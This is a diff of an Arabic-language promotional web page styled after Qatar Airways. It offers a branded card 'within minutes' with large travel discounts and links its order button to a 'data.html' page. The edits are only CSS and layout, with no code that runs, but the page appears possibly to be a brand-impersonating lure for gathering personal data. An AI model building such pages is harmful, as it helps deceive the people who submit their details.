@@ -9,7 +9,7 @@
     <style>
         :root {
             --qatar-maroon: #5C0632;
-            --qatar-gold: #8A704C;
+            --qatar-gold: #D4AF37;
             --bg-light: #F4F4F4;
             --text-dark: #333333;
         }
@@ -76,162 +76,212 @@
             display: block;
         }
         
-        /* Compact Features Section */
-        .features-section {
-            padding: 30px 10px;
+        /* Main Content Section */
+        .content-section {
+            padding: 40px 20px;
             max-width: 1200px;
             margin: 0 auto;
         }
-        .features-title {
+
+        /* Card Promo Section (Top) */
+        .card-showcase {
             text-align: center;
-            font-size: 22px;
-            color: var(--qatar-maroon);
-            margin-bottom: 25px;
-            font-weight: 800;
+            margin-bottom: 50px;
         }
-        
-        /* Grid 3-up like the image */
-        .features-grid {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: 10px;
+
+        .card-promo-large {
+            max-width: 500px;
+            margin: 0 auto 30px;
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 15px 40px rgba(0,0,0,0.15);
+        }
+
+        .card-promo-large img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .card-showcase-title {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--qatar-maroon);
+            margin: 20px 0 10px 0;
+        }
+
+        .card-showcase-subtitle {
+            font-size: 16px;
+            color: #666;
             margin-bottom: 20px;
         }
-        
+
+        /* Features Grid - 4 Cards in a Row */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
         .feature-card {
             background: #ffffff;
-            border-radius: 12px;
+            border-radius: 20px;
             overflow: hidden;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.06);
-            border: 1px solid #eee;
-            text-align: center;
+            box-shadow: 0 8px 25px rgba(0,0,0,0.1);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
             position: relative;
+            height: 100%;
         }
-        
+
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 12px 35px rgba(0,0,0,0.15);
+        }
+
         .card-image-box {
             width: 100%;
-            height: 100px;
+            height: 150px;
             position: relative;
+            overflow: hidden;
         }
-        
+
         .card-image {
             width: 100%;
             height: 100%;
             object-fit: cover;
         }
-        
+
         .card-icon-overlay {
             position: absolute;
-            top: 10px;
-            right: 10px;
-            width: 35px;
-            height: 35px;
-            background: rgba(92, 6, 50, 0.9);
+            top: 12px;
+            right: 12px;
+            width: 50px;
+            height: 50px;
+            background: var(--qatar-maroon);
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
-            font-size: 16px;
+            font-size: 24px;
             color: #ffffff;
-            border: 2px solid #ffffff;
+            border: 3px solid #ffffff;
+            box-shadow: 0 4px 12px rgba(92, 6, 50, 0.3);
         }
-        
+
         .card-body {
-            padding: 12px 5px;
+            padding: 20px 15px;
+            text-align: center;
         }
-        
+
         .card-title {
-            font-size: 15px;
+            font-size: 16px;
             font-weight: 700;
             color: var(--qatar-maroon);
-            margin: 0 0 5px 0;
+            margin: 0 0 8px 0;
         }
-        
+
         .card-label {
-            font-size: 11px;
-            color: #777;
+            font-size: 12px;
+            color: #888;
             display: block;
+            margin-bottom: 5px;
         }
-        
+
         .card-value {
-            font-size: 24px;
+            font-size: 32px;
             font-weight: 800;
             color: var(--qatar-maroon);
             display: block;
         }
-        
-        /* Bottom Professional Bar exactly like image */
-        .bottom-info-bar {
-            background: #ffffff;
-            border-radius: 15px;
+
+        /* Bottom Professional Info Bar */
+        .bottom-info-section {
+            background: linear-gradient(135deg, var(--qatar-maroon) 0%, #7a0a42 100%);
+            border-radius: 20px;
             overflow: hidden;
-            box-shadow: 0 5px 20px rgba(0,0,0,0.1);
-            margin-top: 20px;
-            display: flex;
-            flex-direction: column;
+            box-shadow: 0 10px 40px rgba(92, 6, 50, 0.2);
+            margin-bottom: 40px;
         }
-        
+
         .info-top {
             display: grid;
-            grid-template-columns: 1fr 2fr;
+            grid-template-columns: 280px 1fr;
             background: #ffffff;
         }
-        
+
         .info-cta-box {
             background: var(--qatar-maroon);
             color: #ffffff;
-            padding: 20px;
+            padding: 30px 20px;
             display: flex;
             flex-direction: column;
             justify-content: center;
-            border-radius: 0 0 50px 0;
+            align-items: flex-end;
+            text-align: right;
+            border-radius: 0 0 0 20px;
         }
-        
+
         .info-cta-title {
             font-size: 18px;
             font-weight: 800;
-            margin-bottom: 5px;
+            margin-bottom: 8px;
         }
-        
+
         .info-cta-sub {
             font-size: 14px;
-            opacity: 0.9;
+            opacity: 0.95;
         }
-        
+
+        .info-cta-icon {
+            width: 60px;
+            height: 60px;
+            background: var(--qatar-gold);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 28px;
+            color: var(--qatar-maroon);
+            margin-top: 12px;
+            box-shadow: 0 4px 12px rgba(212, 175, 55, 0.3);
+        }
+
         .info-items-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
-            padding: 15px;
-            gap: 10px;
+            padding: 25px;
+            gap: 15px;
         }
-        
+
         .info-item {
             text-align: center;
             display: flex;
             flex-direction: column;
             align-items: center;
-            border-right: 1px solid #eee;
+            padding: 0 10px;
+            border-right: 1px solid #e0e0e0;
         }
         .info-item:last-child { border-right: none; }
-        
+
         .info-icon {
-            font-size: 18px;
+            font-size: 24px;
             color: var(--qatar-maroon);
-            margin-bottom: 8px;
+            margin-bottom: 10px;
         }
-        
+
         .info-text {
-            font-size: 11px;
+            font-size: 12px;
             font-weight: 600;
             color: #333;
-            line-height: 1.3;
+            line-height: 1.4;
         }
-        
+
         .info-footer-note {
             background: #2c2c2c;
-            color: #eee;
+            color: #aaa;
             text-align: center;
-            padding: 8px;
+            padding: 10px;
             font-size: 12px;
         }
 
@@ -240,31 +290,24 @@
             padding: 40px 20px;
             text-align: center;
         }
-        
-        .card-promo {
-            max-width: 400px;
-            margin: 0 auto;
-            background: #fff;
-            padding: 20px;
-            border-radius: 20px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
-        }
-        
-        .promo-img {
-            width: 100%;
-            border-radius: 10px;
-            margin-bottom: 15px;
-        }
-        
+
         .order-btn {
             background: var(--qatar-maroon);
             color: #fff;
-            padding: 14px 40px;
+            padding: 16px 50px;
             border-radius: 30px;
             text-decoration: none;
             font-weight: 700;
+            font-size: 16px;
             display: inline-block;
-            box-shadow: 0 5px 15px rgba(92, 6, 50, 0.3);
+            box-shadow: 0 8px 20px rgba(92, 6, 50, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .order-btn:hover {
+            background: #7a0a42;
+            box-shadow: 0 12px 30px rgba(92, 6, 50, 0.4);
+            transform: translateY(-2px);
         }
 
         /* Footer Styling */
@@ -296,11 +339,43 @@
             color: #bbb;
         }
         
-        @media (max-width: 768px) {
-            .info-top { grid-template-columns: 1fr; }
-            .info-cta-box { border-radius: 0; text-align: center; }
-            .info-items-grid { grid-template-columns: repeat(2, 1fr); }
+        @media (max-width: 1024px) {
+            .features-grid {
+                grid-template-columns: repeat(2, 1fr);
+                gap: 15px;
+            }
+            .info-items-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            .info-item {
+                border-right: none;
+                border-bottom: 1px solid #e0e0e0;
+                padding-bottom: 15px;
+            }
             .info-item:nth-child(2n) { border-right: none; }
+        }
+
+        @media (max-width: 768px) {
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+            .info-top {
+                grid-template-columns: 1fr;
+            }
+            .info-cta-box {
+                border-radius: 0;
+                text-align: center;
+                align-items: center;
+            }
+            .info-items-grid {
+                grid-template-columns: 1fr;
+                padding: 15px;
+            }
+            .info-item {
+                border-right: none;
+                border-bottom: none;
+                padding: 15px 0;
+            }
         }
     </style>
 </head>
@@ -325,14 +400,21 @@
             <source src="videos/banner.mp4" type="video/mp4">
         </video>
         
-        <div class="features-section">
-            <h2 class="features-title">مميزات بطاقة الخطوط الجوية القطرية</h2>
-            
+        <div class="content-section">
+            <!-- Card Showcase Section -->
+            <div class="card-showcase">
+                <div class="card-promo-large">
+                    <img src="images/watches/card1.png" alt="بطاقة الخطوط الجوية القطرية المميزة">
+                </div>
+                <h2 class="card-showcase-title">بطاقة مميزة من الخطوط الجوية القطرية</h2>
+                <p class="card-showcase-subtitle">احصل على بطاقتك الآن خلال دقائق واستمتع بعالم من الرفاهية والمزايا التي لا تنتهي</p>
+            </div>
+
+            <!-- Features Grid - 4 Cards -->
             <div class="features-grid">
-                <!-- Row 1 -->
                 <div class="feature-card">
                     <div class="card-image-box">
-                        <img src="https://images.unsplash.com/photo-1628157588553-5eeea00af15c?w=300&h=200&fit=crop" class="card-image">
+                        <img src="https://images.unsplash.com/photo-1628157588553-5eeea00af15c?w=400&h=200&fit=crop" class="card-image" alt="مواقف السيارات">
                         <div class="card-icon-overlay"><i class="fas fa-parking"></i></div>
                     </div>
                     <div class="card-body">
@@ -344,7 +426,7 @@
                 
                 <div class="feature-card">
                     <div class="card-image-box">
-                        <img src="https://images.unsplash.com/photo-1544016768-982d1554f0b9?w=300&h=200&fit=crop" class="card-image">
+                        <img src="https://images.unsplash.com/photo-1544016768-982d1554f0b9?w=400&h=200&fit=crop" class="card-image" alt="تذاكر الطيران">
                         <div class="card-icon-overlay"><i class="fas fa-plane"></i></div>
                     </div>
                     <div class="card-body">
@@ -356,7 +438,7 @@
                 
                 <div class="feature-card">
                     <div class="card-image-box">
-                        <img src="https://images.unsplash.com/photo-1621359301443-43950f2496a3?w=300&h=200&fit=crop" class="card-image">
+                        <img src="https://images.unsplash.com/photo-1621359301443-43950f2496a3?w=400&h=200&fit=crop" class="card-image" alt="حجوزات الفنادق">
                         <div class="card-icon-overlay"><i class="fas fa-hotel"></i></div>
                     </div>
                     <div class="card-body">
@@ -366,10 +448,9 @@
                     </div>
                 </div>
                 
-                <!-- Row 2 -->
                 <div class="feature-card">
                     <div class="card-image-box">
-                        <img src="https://images.unsplash.com/photo-1544016768-982d1554f0b9?w=300&h=200&fit=crop" class="card-image">
+                        <img src="https://images.unsplash.com/photo-1552820728-8ac41f1ce891?w=400&h=200&fit=crop" class="card-image" alt="تأجير السيارات">
                         <div class="card-icon-overlay"><i class="fas fa-car"></i></div>
                     </div>
                     <div class="card-body">
@@ -378,75 +459,15 @@
                         <span class="card-value">70%</span>
                     </div>
                 </div>
-                
-                <div class="feature-card">
-                    <div class="card-image-box">
-                        <img src="https://images.unsplash.com/photo-1628157588553-5eeea00af15c?w=300&h=200&fit=crop" class="card-image">
-                        <div class="card-icon-overlay"><i class="fas fa-shopping-bag"></i></div>
-                    </div>
-                    <div class="card-body">
-                        <h3 class="card-title">المتاجر العالمية</h3>
-                        <span class="card-label">خصم يصل إلى</span>
-                        <span class="card-value">35%</span>
-                    </div>
-                </div>
-                
-                <div class="feature-card">
-                    <div class="card-image-box">
-                        <img src="https://images.unsplash.com/photo-1621359301443-43950f2496a3?w=300&h=200&fit=crop" class="card-image">
-                        <div class="card-icon-overlay"><i class="fas fa-film"></i></div>
-                    </div>
-                    <div class="card-body">
-                        <h3 class="card-title">السينما والترفيه</h3>
-                        <span class="card-label">خصم يصل إلى</span>
-                        <span class="card-value">35%</span>
-                    </div>
-                </div>
-
-                <!-- Row 3 -->
-                <div class="feature-card">
-                    <div class="card-image-box">
-                        <img src="https://images.unsplash.com/photo-1544016768-982d1554f0b9?w=300&h=200&fit=crop" class="card-image">
-                        <div class="card-icon-overlay"><i class="fas fa-star"></i></div>
-                    </div>
-                    <div class="card-body">
-                        <h3 class="card-title">أولوية الحجز</h3>
-                        <span class="card-label">ميزة حصرية</span>
-                        <span class="card-value">VIP</span>
-                    </div>
-                </div>
-
-                <div class="feature-card">
-                    <div class="card-image-box">
-                        <img src="https://images.unsplash.com/photo-1628157588553-5eeea00af15c?w=300&h=200&fit=crop" class="card-image">
-                        <div class="card-icon-overlay"><i class="fas fa-wifi"></i></div>
-                    </div>
-                    <div class="card-body">
-                        <h3 class="card-title">إنترنت مجاني</h3>
-                        <span class="card-label">على متن الطائرة</span>
-                        <span class="card-value">مجاني</span>
-                    </div>
-                </div>
-
-                <div class="feature-card">
-                    <div class="card-image-box">
-                        <img src="https://images.unsplash.com/photo-1621359301443-43950f2496a3?w=300&h=200&fit=crop" class="card-image">
-                        <div class="card-icon-overlay"><i class="fas fa-suitcase"></i></div>
-                    </div>
-                    <div class="card-body">
-                        <h3 class="card-title">وزن إضافي</h3>
-                        <span class="card-label">حقيبة إضافية</span>
-                        <span class="card-value">مجاني</span>
-                    </div>
-                </div>
             </div>
             
-            <!-- Professional Bottom Bar -->
-            <div class="bottom-info-bar">
+            <!-- Professional Bottom Info Bar -->
+            <div class="bottom-info-section">
                 <div class="info-top">
                     <div class="info-cta-box">
                         <div class="info-cta-title">لطلب بطاقتك الآن</div>
                         <div class="info-cta-sub">وخلال دقائق!</div>
+                        <div class="info-cta-icon"><i class="fas fa-clock"></i></div>
                     </div>
                     <div class="info-items-grid">
                         <div class="info-item">
@@ -458,7 +479,7 @@
                             <span class="info-text">تقبل عالمياً<br>في ملايين المتاجر</span>
                         </div>
                         <div class="info-item">
-                            <i class="fas fa-wifi info-icon"></i>
+                            <i class="fas fa-mobile-alt info-icon"></i>
                             <span class="info-text">ادفع بسهولة<br>وفي أي مكان</span>
                         </div>
                         <div class="info-item">
@@ -472,10 +493,7 @@
         </div>
 
         <div class="order-section">
-            <div class="card-promo">
-                <img src="images/watches/card1.png" class="promo-img">
-                <a href="data.html" class="order-btn">احصل على بطاقتك الآن</a>
-            </div>
+            <a href="data.html" class="order-btn">احصل على بطاقتك الآن</a>
         </div>
     </div>
 
